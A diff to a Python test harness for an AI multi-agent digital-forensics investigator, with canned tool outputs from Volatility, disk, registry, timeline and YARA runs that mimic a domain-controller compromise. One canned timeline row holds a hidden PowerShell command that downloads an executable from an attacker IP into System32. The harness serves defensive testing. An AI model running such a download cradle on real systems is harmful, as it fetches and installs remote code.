@@ -1,12 +1,14 @@
 """Live end-to-end run of the Lead Investigator graph (real models via OpenRouter).
 
-The evidence layer is a canned Volatility scenario shaped after Case 001
+The evidence layer is a canned FULL-SPINE scenario shaped after Case 001
 ("Stolen Szechuan Sauce" — coreupdate.exe, attacker 194.61.24.102, RDP ingress
-on DC01), so this exercises REAL multi-agent autonomy — routing, tool use,
-self-correction, the citation contract — without the not-yet-installed
-Volatility binary. The first vol_malfind call is rigged to fail, probing live
-self-correction at supervisor scale. Swapping in the real ToolRunner against
-real evidence is deliverable 15.
+on DC01, CoreUpdater Run-key persistence, deleted secret.zip/loot.zip exfil
+staging): memory (Volatility), disk (fls/icat), registry (RegRipper), timeline
+(plaso), and YARA — so this exercises REAL multi-agent autonomy across all four
+specialists — routing, tool use, self-correction, the citation contract —
+without the not-yet-installed forensic binaries. The first vol_malfind call is
+rigged to fail, probing live self-correction at supervisor scale. Swapping in
+the real ToolRunner against real evidence is deliverable 15.
 
 Run:  uv run python scripts/live_supervisor_run.py
 Env:  SPOOR_OPENROUTER_API_KEY (./.env), optional SPOOR_MODEL / SPOOR_LEAD_MODEL.
@@ -99,14 +101,80 @@ _BY_PLUGIN = {
     "windows.cmdline": _CMDLINE,
 }
 
+_FLS_OUTPUT = (
+    "d/d 36-144-1:\tWindows\n"
+    "d/d 5662-144-6:\tWindows/System32\n"
+    "r/r 28194-128-3:\tWindows/System32/coreupdate.exe\n"
+    "r/r 5921-128-1:\tWindows/System32/config/SOFTWARE\n"
+    "d/d 10841-144-2:\tUsers/Administrator/Desktop\n"
+    "r/r * 31002-128-1:\tUsers/Administrator/Desktop/secret.zip\n"
+    "r/r * 31077-128-4:\tUsers/Administrator/Desktop/loot.zip\n"
+)
+
+_RIP_RUN_OUTPUT = """run v.20200511
+(Software) [Autostart] Get autostart key contents from Software hive
+
+Microsoft\\Windows\\CurrentVersion\\Run
+LastWrite Time 2020-09-19 02:24:40 (UTC)
+  CoreUpdater - C:\\Windows\\System32\\coreupdate.exe -install
+"""
+
+_PSORT_CSV = """datetime,timestamp_desc,source,source_long,message,parser,display_name,tag
+2020-09-19T02:19:33+00:00,Event Time,EVT,WinEVTX,Security 4624 logon type 10 (RemoteInteractive) Administrator from 194.61.24.102,winevtx,Security.evtx,-
+2020-09-19T02:21:47+00:00,Process Start,LOG,Sysmon,powershell.exe -nop -w hidden -c IWR http://194.61.24.102/coreupdate.exe -OutFile C:/Windows/System32/coreupdate.exe (PID 4316 parent explorer.exe),winevtx,Sysmon.evtx,-
+2020-09-19T02:24:06+00:00,Content Modification Time,FILE,NTFS,C:/Windows/System32/coreupdate.exe created (28194-128-3),filestat,disk.dd,-
+2020-09-19T02:24:12+00:00,Process Start,LOG,Sysmon,coreupdate.exe -install (PID 3644 parent powershell.exe 4316),winevtx,Sysmon.evtx,-
+2020-09-19T02:24:40+00:00,Registry Key Write,REG,Registry,HKLM/Software/Microsoft/Windows/CurrentVersion/Run CoreUpdater = C:/Windows/System32/coreupdate.exe -install,winreg,SOFTWARE,-
+2020-09-19T02:31:02+00:00,Content Modification Time,FILE,NTFS,C:/Users/Administrator/Desktop/secret.zip created,filestat,disk.dd,-
+2020-09-19T02:48:11+00:00,Content Modification Time,FILE,NTFS,C:/Users/Administrator/Desktop/loot.zip created,filestat,disk.dd,-
+"""
+
+_PE_BYTES = b"MZ\x90\x00\x03\x00\x00\x00SZECHUAN-BACKDOOR-EXTRACTED-BODY"
+
+
+class RawResult:
+    """Minimal RawToolResult stand-in (exit_code, stdout: bytes, stderr: str)."""
+
+    def __init__(self, exit_code: int, stdout: bytes, stderr: str):
+        self.exit_code = exit_code
+        self.stdout = stdout
+        self.stderr = stderr
+
 
 class ScenarioRunner:
-    """Canned Volatility outputs; the FIRST malfind call fails (self-correction probe)."""
+    """Canned full-spine outputs; the FIRST malfind call fails (self-correction probe)."""
 
     def __init__(self) -> None:
         self.malfind_calls = 0
 
     def run(self, binary: str, args: list[str]) -> ToolResult:
+        if binary == "vol":
+            return self._vol(args)
+        if binary == "fls":
+            return ToolResult(0, _FLS_OUTPUT, "")
+        if binary == "rip.pl":
+            plugin = args[args.index("-p") + 1] if "-p" in args else "?"
+            if plugin == "run":
+                return ToolResult(0, _RIP_RUN_OUTPUT, "")
+            return ToolResult(0, f"{plugin} v.20200511\n(no relevant entries)\n", "")
+        if binary == "log2timeline.py":
+            # The real binary writes the storage file; emulate so the artifact exists.
+            storage = Path(args[args.index("--storage-file") + 1])
+            storage.parent.mkdir(parents=True, exist_ok=True)
+            storage.write_bytes(b"PLASO-CANNED-STORE")
+            return ToolResult(0, "Processing completed. 7 events extracted.", "")
+        if binary == "psort.py":
+            return ToolResult(0, _PSORT_CSV, "")
+        if binary == "yara":
+            return ToolResult(0, f"SzechuanBackdoor {args[-1]}\n", "")
+        return ToolResult(2, "", f"unknown binary {binary}")
+
+    def run_raw(self, binary: str, args: list[str]) -> RawResult:
+        if binary == "icat":
+            return RawResult(0, _PE_BYTES, "")
+        return RawResult(2, b"", f"unknown binary {binary}")
+
+    def _vol(self, args: list[str]) -> ToolResult:
         plugin = args[-1]
         if plugin == "windows.malfind":
             self.malfind_calls += 1
@@ -169,8 +237,19 @@ def main() -> int:
 
     evidence_root = REPO / "evidence" / "case001"
     evidence_root.mkdir(parents=True, exist_ok=True)
-    image = evidence_root / "citadeldc01.mem"
-    image.write_bytes(b"SPOOR-CANNED-SCENARIO")  # stub: the runner is canned
+    (evidence_root / "citadeldc01.mem").write_bytes(b"SPOOR-CANNED-SCENARIO")  # stubs:
+    (evidence_root / "disk.dd").write_bytes(b"SPOOR-CANNED-DISK")              # runner is canned
+
+    workspace_root = run_dir / "workspace"
+    workspace_root.mkdir(parents=True, exist_ok=True)
+    # The analyst's case rule pack — yara rules live in the workspace jail.
+    (workspace_root / "case001.yar").write_text(
+        'rule SzechuanBackdoor {\n'
+        '  meta: description = "coreupdate.exe backdoor markers (Case 001)"\n'
+        '  strings: $mz = "MZ" $tag = "SZECHUAN"\n'
+        '  condition: $mz at 0 and $tag\n'
+        '}\n'
+    )
 
     audit = AuditLog(run_dir / "audit.jsonl")
     runner = ScenarioRunner()
@@ -180,19 +259,25 @@ def main() -> int:
         runner=runner,
         audit=audit,
         evidence_root=evidence_root,
+        workspace_root=workspace_root,
         lead_model=lead,
         triage_model=specialist,
+        timeline_model=specialist,
         ioc_model=specialist,
         reporter_model=specialist,
     )
 
     thread_id = f"case001-live-{stamp:%Y%m%dT%H%M%SZ}"
-    config = {"configurable": {"thread_id": thread_id}, "recursion_limit": 80}
+    config = {"configurable": {"thread_id": thread_id}, "recursion_limit": 100}
     brief = (
-        "Investigate the Windows memory image 'citadeldc01.mem' from host DC01 (10.42.85.10), "
-        "a domain controller suspected of compromise. Determine whether the host is compromised, "
-        "how the attacker got in, what was executed, and any indicators of compromise. "
-        "Work the case to completion and deliver the final report through the reporter."
+        "Investigate host DC01 (10.42.85.10), a domain controller suspected of compromise. "
+        "Evidence available: memory image 'citadeldc01.mem' and disk image 'disk.dd' "
+        "(the SOFTWARE registry hive is at Windows/System32/config/SOFTWARE on the disk). "
+        "An analyst YARA rule pack is available in the workspace as 'case001.yar'. "
+        "Determine whether the host is compromised, how the attacker got in, what was "
+        "executed, the order of attacker activity, persistence, and any staging or "
+        "exfiltration — with indicators of compromise. Work the case to completion and "
+        "deliver the final report through the reporter."
     )
 
     print(f"thread: {thread_id}")
